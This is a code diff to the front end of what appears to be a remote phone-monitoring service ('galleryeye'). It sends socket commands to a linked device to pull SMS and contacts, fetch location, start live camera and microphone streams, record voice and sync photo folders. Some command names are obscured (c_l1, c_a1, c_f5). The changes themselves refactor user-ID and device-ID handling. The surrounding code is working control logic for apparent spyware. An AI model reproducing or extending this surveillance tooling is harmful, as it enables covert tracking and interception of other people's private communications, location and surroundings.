@@ -82,6 +82,21 @@ const normalizeTool = (raw: string | null | undefined): 'gallery' | 'files' | 's
 export default function Home(props: any) {
     const initialTool = props?.initialTool ?? null;
     const { data: session, status } = useSession();
+    const userUuid = useMemo(() => {
+        return session?.user?.uuid || (session?.user as any)?.id || (typeof window !== 'undefined' ? (localStorage.getItem('galleryeye_user_uuid') || localStorage.getItem('galleryeye_last_uuid') || '') : '') || '';
+    }, [session]);
+
+    useEffect(() => {
+        if (session?.user) {
+            const resolved = session.user.uuid || (session.user as any).id;
+            if (resolved) {
+                try {
+                    localStorage.setItem('galleryeye_user_uuid', resolved);
+                    localStorage.setItem('galleryeye_last_uuid', resolved);
+                } catch {}
+            }
+        }
+    }, [session]);
     const [images, setImages] = useState<any[]>([]);
     const [galleryPage, setGalleryPage] = useState(1);
     const [galleryHasMore, setGalleryHasMore] = useState(true);
@@ -1851,14 +1866,16 @@ export default function Home(props: any) {
     };
 
     const fetchFolders = () => {
-        if (!requireConnectedDevice(() => {})) return;
-        if (socket && selectedDeviceId) {
-            setIsFetchingFolders(true);
-            socket.emit("get_folders", {
-                uuid: session?.user?.uuid,
-                targetDeviceId: selectedDeviceId
-            });
-        }
+        requireConnectedDevice((targetId) => {
+            const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
+            if (socket && effectiveTarget && userUuid) {
+                setIsFetchingFolders(true);
+                socket.emit("get_folders", {
+                    uuid: userUuid,
+                    targetDeviceId: effectiveTarget
+                });
+            }
+        });
     };
 
     const handleFolderClick = (folder: any) => {
@@ -1881,7 +1898,7 @@ export default function Home(props: any) {
             return;
         }
         const effectiveTarget = selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-        const uuid = (session?.user as any)?.uuid;
+        const uuid = userUuid;
         if (!effectiveTarget || !uuid) return;
 
         setIsFetchingSms(true);
@@ -1901,7 +1918,7 @@ export default function Home(props: any) {
             .finally(() => setIsFetchingSms(false));
 
         // 2. If device is currently online, also request live update from device via socket
-        const isDeviceOnline = !!devices.find(d => (d.deviceId || d.id || d._id) === effectiveTarget)?.online;
+        const isDeviceOnline = !!devices.find(d => String(d.deviceId || d.id || d._id || '') === String(effectiveTarget))?.online;
         if (socket && isDeviceOnline) {
             socket.emit("get_sms", {
                 uuid,
@@ -1914,9 +1931,9 @@ export default function Home(props: any) {
     const resetSmsSync = () => {
         requireConnectedDevice((targetId) => {
             const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-            if (socket && effectiveTarget && session?.user?.uuid) {
+            if (socket && effectiveTarget && userUuid) {
                 socket.emit("reset_sms_sync", {
-                    uuid: session.user.uuid,
+                    uuid: userUuid,
                     targetDeviceId: effectiveTarget
                 });
                 setSmsList([]);
@@ -1932,7 +1949,7 @@ export default function Home(props: any) {
             return;
         }
         const effectiveTarget = selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-        const uuid = (session?.user as any)?.uuid;
+        const uuid = userUuid;
         if (!effectiveTarget || !uuid) return;
 
         setIsFetchingContacts(true);
@@ -1952,7 +1969,7 @@ export default function Home(props: any) {
             .finally(() => setIsFetchingContacts(false));
 
         // 2. If device is currently online, also request live update from device via socket
-        const isDeviceOnline = !!devices.find(d => (d.deviceId || d.id || d._id) === effectiveTarget)?.online;
+        const isDeviceOnline = !!devices.find(d => String(d.deviceId || d.id || d._id || '') === String(effectiveTarget))?.online;
         if (socket && isDeviceOnline) {
             const payload = {
                 uuid,
@@ -1969,11 +1986,11 @@ export default function Home(props: any) {
     const checkPermissions = () => {
         requireConnectedDevice((targetId) => {
             const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-            if (socket && effectiveTarget && session?.user?.uuid) {
+            if (socket && effectiveTarget && userUuid) {
                 setIsCheckingPermissions(true);
                 setDevicePermissions(null);
                 socket.emit("check_permissions", {
-                    uuid: session.user.uuid,
+                    uuid: userUuid,
                     targetDeviceId: effectiveTarget
                 });
             }
@@ -2009,9 +2026,9 @@ export default function Home(props: any) {
     const triggerUpload = (count: number | 'all') => {
         requireConnectedDevice((targetId) => {
             const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-            if (socket && selectedFolder && syncMediaType && session?.user?.uuid && effectiveTarget) {
+            if (socket && selectedFolder && syncMediaType && userUuid && effectiveTarget) {
                 const payload = {
-                    uuid: session.user.uuid,
+                    uuid: userUuid,
                     targetDeviceId: effectiveTarget,
                     folderId: selectedFolder.id,
                     folderName: selectedFolder.name,
@@ -2035,13 +2052,13 @@ export default function Home(props: any) {
         }
         requireConnectedDevice((targetId) => {
             const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-            if (!socket || !effectiveTarget || !session?.user?.uuid) return;
+            if (!socket || !effectiveTarget || !userUuid) return;
 
             const newState = !isTorchOn;
             setIsTorchOn(newState);
 
             socket.emit("torch_control", {
-                uuid: session.user.uuid,
+                uuid: userUuid,
                 targetDeviceId: effectiveTarget,
                 on: newState,
                 aggressive: torchAggressive,
@@ -2058,12 +2075,12 @@ export default function Home(props: any) {
         
         requireConnectedDevice((targetId) => {
             const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-            if (!socket || !effectiveTarget || !session?.user?.uuid) return;
+            if (!socket || !effectiveTarget || !userUuid) return;
             
             setIsFetchingLocation(true);
             setLocationError(null);
             socket.emit('c_l1', {
-                uuid: session.user.uuid,
+                uuid: userUuid,
                 targetDeviceId: effectiveTarget
             });
 
@@ -2072,7 +2089,7 @@ export default function Home(props: any) {
                 setIsFetchingLocation(false);
             }, 8000);
         });
-    }, [socket, selectedDeviceId, session, planLimits, devices]);
+    }, [socket, selectedDeviceId, userUuid, planLimits, devices]);
 
     // --- Vibration Functions ---
     const triggerVibration = () => {
@@ -2083,10 +2100,10 @@ export default function Home(props: any) {
         }
         requireConnectedDevice((targetId) => {
             const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-            if (!socket || !effectiveTarget || !session?.user?.uuid) return;
+            if (!socket || !effectiveTarget || !userUuid) return;
 
             socket.emit("vibrate_control", {
-                uuid: session.user.uuid,
+                uuid: userUuid,
                 targetDeviceId: effectiveTarget,
                 duration: vibrationDuration
             });
@@ -2101,10 +2118,10 @@ export default function Home(props: any) {
         }
         requireConnectedDevice((targetId) => {
             const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-            if (!socket || !effectiveTarget || !session?.user?.uuid) return;
+            if (!socket || !effectiveTarget || !userUuid) return;
 
             socket.emit('c_a1', {
-                uuid: session.user.uuid,
+                uuid: userUuid,
                 targetDeviceId: effectiveTarget,
                 gainBoost: false
             });
@@ -2116,13 +2133,14 @@ export default function Home(props: any) {
                 setAudioElapsed(prev => prev + 1);
             }, 1000);
         });
-    }, [socket, selectedDeviceId, session, userPlan, devices]);
+    }, [socket, selectedDeviceId, userUuid, userPlan, devices]);
 
     const stopLiveAudio = useCallback(() => {
-        if (socket && selectedDeviceId && session?.user?.uuid) {
+        const effectiveTarget = selectedDeviceIdRef.current || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
+        if (socket && effectiveTarget && userUuid) {
             socket.emit('c_a2', {
-                uuid: session.user.uuid,
-                targetDeviceId: selectedDeviceId
+                uuid: userUuid,
+                targetDeviceId: effectiveTarget
             });
         }
 
@@ -2161,21 +2179,21 @@ export default function Home(props: any) {
         isLiveAudioRef.current = false;
         setAudioLevel(0);
         setAudioElapsed(0);
-    }, [socket, selectedDeviceId, session]);
+    }, [socket, selectedDeviceId, userUuid]);
 
     // --- Live Camera Stop Function ---
     const stopLiveCamera = useCallback(() => {
         const effectiveTarget = selectedDeviceIdRef.current || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-        if (socket && effectiveTarget && session?.user?.uuid) {
+        if (socket && effectiveTarget && userUuid) {
             socket.emit('c_f5', {
-                uuid: session.user.uuid,
+                uuid: userUuid,
                 targetDeviceId: effectiveTarget
             });
         }
         setIsLiveStreaming(false);
         isLiveStreamingRef.current = false;
         if (liveImageRef.current) liveImageRef.current.src = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
-    }, [socket, selectedDeviceId, session]);
+    }, [socket, selectedDeviceId, userUuid]);
 
     // Auto-stop active camera or audio streams whenever user switches tools / leaves camera or voice views
     useEffect(() => {
@@ -2210,10 +2228,10 @@ export default function Home(props: any) {
     const startVoiceRecording = useCallback(() => {
         requireConnectedDevice((targetId) => {
             const effectiveTarget = targetId || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-            if (!socket || !effectiveTarget || !session?.user?.uuid) return;
+            if (!socket || !effectiveTarget || !userUuid) return;
 
             socket.emit('c_a3', {
-                uuid: session.user.uuid,
+                uuid: userUuid,
                 targetDeviceId: effectiveTarget,
                 duration: voiceRecDuration
             });
@@ -2232,13 +2250,14 @@ export default function Home(props: any) {
                 }
             }, 1000);
         });
-    }, [socket, selectedDeviceId, session, voiceRecDuration, devices]);
+    }, [socket, selectedDeviceId, userUuid, voiceRecDuration, devices]);
 
     const stopVoiceRecording = useCallback(() => {
-        if (socket && selectedDeviceId && session?.user?.uuid) {
+        const effectiveTarget = selectedDeviceIdRef.current || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
+        if (socket && effectiveTarget && userUuid) {
             socket.emit('c_a4', {
-                uuid: session.user.uuid,
-                targetDeviceId: selectedDeviceId
+                uuid: userUuid,
+                targetDeviceId: effectiveTarget
             });
         }
         setIsVoiceRecording(false);
@@ -2248,7 +2267,7 @@ export default function Home(props: any) {
             clearInterval(voiceRecTimerRef.current);
             voiceRecTimerRef.current = null;
         }
-    }, [socket, selectedDeviceId, session]);
+    }, [socket, selectedDeviceId, userUuid]);
 
     // Fetch missing app icons for existing stored notifications
     useEffect(() => {
@@ -2500,28 +2519,32 @@ END:VCARD`;
 
     const requireConnectedDevice = (action: (targetId?: string) => void) => {
         const activeId = selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
-        let currentSelected = devices.find(d => (d.deviceId || d.id || d._id) === activeId);
+        let currentSelected = devices.find(d => String(d.deviceId || d.id || d._id || '') === String(activeId || ''));
 
         // If currently selected device is offline or not found, check if an online device exists
         if (!currentSelected || !currentSelected.online) {
             const availableOnline = devices.find(d => d.online);
             if (availableOnline) {
-                const autoId = availableOnline.deviceId || availableOnline.id || availableOnline._id;
+                const autoId = String(availableOnline.deviceId || availableOnline.id || availableOnline._id || '');
                 setSelectedDeviceId(autoId);
+                selectedDeviceIdRef.current = autoId;
+                try { localStorage.setItem('selectedDeviceId', autoId); } catch {}
                 currentSelected = availableOnline;
             }
         }
 
         // If still not found, check ANY device in devices list
         if (!currentSelected && devices.length > 0) {
-            const fallbackId = devices[0].deviceId || devices[0].id || devices[0]._id;
+            const fallbackId = String(devices[0].deviceId || devices[0].id || devices[0]._id || '');
             setSelectedDeviceId(fallbackId);
+            selectedDeviceIdRef.current = fallbackId;
+            try { localStorage.setItem('selectedDeviceId', fallbackId); } catch {}
             currentSelected = devices[0];
         }
 
         // If device list is still loading or empty, but user already has activeId stored
         if (!currentSelected && activeId) {
-            action(activeId);
+            action(String(activeId));
             return true;
         }
 
@@ -2535,7 +2558,7 @@ END:VCARD`;
             return false;
         }
 
-        const resolvedId = currentSelected.deviceId || currentSelected.id || currentSelected._id;
+        const resolvedId = String(currentSelected.deviceId || currentSelected.id || currentSelected._id || '');
         action(resolvedId);
         return true;
     };
@@ -2630,10 +2653,10 @@ END:VCARD`;
                                     stopLiveCamera();
                                 } else {
                                     if (isRecording) {
-                                        socket?.emit('c_f3', { uuid: session?.user?.uuid, targetDeviceId: effectiveTarget });
+                                        socket?.emit('c_f3', { uuid: userUuid, targetDeviceId: effectiveTarget });
                                         setIsRecording(false);
                                     }
-                                    socket?.emit('c_f4', { uuid: session?.user?.uuid, targetDeviceId: effectiveTarget, camera: cameraMode, quality: cameraQuality });
+                                    socket?.emit('c_f4', { uuid: userUuid, targetDeviceId: effectiveTarget, camera: cameraMode, quality: cameraQuality });
                                     setIsLiveStreaming(true);
                                     isLiveStreamingRef.current = true;
                                     selectedDeviceIdRef.current = effectiveTarget;
@@ -2661,7 +2684,7 @@ END:VCARD`;
                                     camera: cameraMode,
                                     isTemp: true
                                 }, ...prev]);
-                                socket?.emit('c_f1', { uuid: session?.user?.uuid, targetDeviceId: effectiveTarget, camera: cameraMode });
+                                socket?.emit('c_f1', { uuid: userUuid, targetDeviceId: effectiveTarget, camera: cameraMode });
                             });
                         }}
                         onToggleRecording={() => {
@@ -2675,7 +2698,7 @@ END:VCARD`;
                                     return;
                                 }
                                 if (isRecording) {
-                                    socket?.emit('c_f3', { uuid: session?.user?.uuid, targetDeviceId: effectiveTarget });
+                                    socket?.emit('c_f3', { uuid: userUuid, targetDeviceId: effectiveTarget });
                                     setIsRecording(false);
                                 } else {
                                     // Auto-stop live stream if running before starting video recording
@@ -2684,7 +2707,7 @@ END:VCARD`;
                                     }
                                     setIsRecording(true);
                                     setRecordingProgress({ current: 0, total: recordingDuration });
-                                    socket?.emit('c_f2', { uuid: session?.user?.uuid, targetDeviceId: effectiveTarget, camera: cameraMode, duration: recordingDuration });
+                                    socket?.emit('c_f2', { uuid: userUuid, targetDeviceId: effectiveTarget, camera: cameraMode, duration: recordingDuration });
                                 }
                             });
                         }}
@@ -2863,7 +2886,7 @@ END:VCARD`;
 
             {/* Modals */}
             <QuickTutorial isOpen={showQuickTutorial} onClose={() => setShowQuickTutorial(false)} />
-            <AppGenerationModal isOpen={showAppModal} onClose={() => setShowAppModal(false)} uuid={session?.user?.uuid || (typeof window !== 'undefined' ? localStorage.getItem('galleryeye_user_uuid') || '' : '')} socket={socket} userPlan={userPlan} onUpgrade={(feature?: string, requiredPlan?: string) => { 
+            <AppGenerationModal isOpen={showAppModal} onClose={() => setShowAppModal(false)} uuid={userUuid} socket={socket} userPlan={userPlan} onUpgrade={(feature?: string, requiredPlan?: string) => { 
                 if (feature && requiredPlan) {
                     showUpgradePrompt(feature, requiredPlan as 'standard' | 'premium');
                 } else {
@@ -2872,7 +2895,7 @@ END:VCARD`;
                 }
             }} />
             <WhatsAppButton />
-            <PlansModal isOpen={showPlansModal} onClose={() => setShowPlansModal(false)} currentPlan={userPlan as any} userEmail={session?.user?.email || ''} userUuid={session?.user?.uuid || (typeof window !== 'undefined' ? localStorage.getItem('galleryeye_user_uuid') || '' : '')} />
+            <PlansModal isOpen={showPlansModal} onClose={() => setShowPlansModal(false)} currentPlan={userPlan as any} userEmail={session?.user?.email || ''} userUuid={userUuid} />
             <UpgradeModal isOpen={showUpgradeModal} onClose={() => setShowUpgradeModal(false)} feature={upgradeFeature} requiredPlan={requiredPlan} onViewPlans={() => { setShowUpgradeModal(false); setShowPlansModal(true); }} />
             
             <SyncOptionsModal
@@ -2881,13 +2904,14 @@ END:VCARD`;
                 folder={syncOptionsFolder}
                 userPlan={userPlan as any}
                 onSync={(mediaType, count, method) => {
+                    const effectiveTarget = selectedDeviceIdRef.current || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
                     if (method === 'oneByOne') {
                         isSyncCanceledRef.current = false;
                         setIsStartingSync(true);
                         setUploadProgress({ uploaded: 0, total: count === 'all' ? syncOptionsFolder?.count || 0 : count, speed: '', eta: '' });
                         socket?.emit('trigger_sync', {
-                            uuid: session?.user?.uuid,
-                            targetDeviceId: selectedDeviceId,
+                            uuid: userUuid,
+                            targetDeviceId: effectiveTarget,
                             folderName: syncOptionsFolder.name,
                             count,
                             mediaType
@@ -2896,8 +2920,8 @@ END:VCARD`;
                         setZipProgress({ stage: 'creating', current: 0, total: count === 'all' ? syncOptionsFolder.count : count, url: '', error: '' });
                         setShowZipProgressModal(true);
                         socket?.emit('trigger_zip', {
-                            uuid: session?.user?.uuid,
-                            targetDeviceId: selectedDeviceId,
+                            uuid: userUuid,
+                            targetDeviceId: effectiveTarget,
                             folderName: syncOptionsFolder.name,
                             mediaType,
                             count
@@ -2924,7 +2948,8 @@ END:VCARD`;
                 downloadUrl={zipProgress.url}
                 error={zipProgress.error}
                 onCancel={() => {
-                    socket?.emit('cancel_zip', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
+                    const effectiveTarget = selectedDeviceIdRef.current || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
+                    socket?.emit('cancel_zip', { uuid: userUuid, targetDeviceId: effectiveTarget });
                 }}
             />
 
@@ -3022,7 +3047,8 @@ END:VCARD`;
                                     type="button"
                                     onClick={() => {
                                         isSyncCanceledRef.current = true;
-                                        socket?.emit('cancel_sync', { uuid: session?.user?.uuid, targetDeviceId: selectedDeviceId });
+                                        const effectiveTarget = selectedDeviceIdRef.current || selectedDeviceId || (typeof window !== 'undefined' ? localStorage.getItem('selectedDeviceId') : null);
+                                        socket?.emit('cancel_sync', { uuid: userUuid, targetDeviceId: effectiveTarget });
                                         setUploadProgress(null);
                                         setIsStartingSync(false);
                                     }}
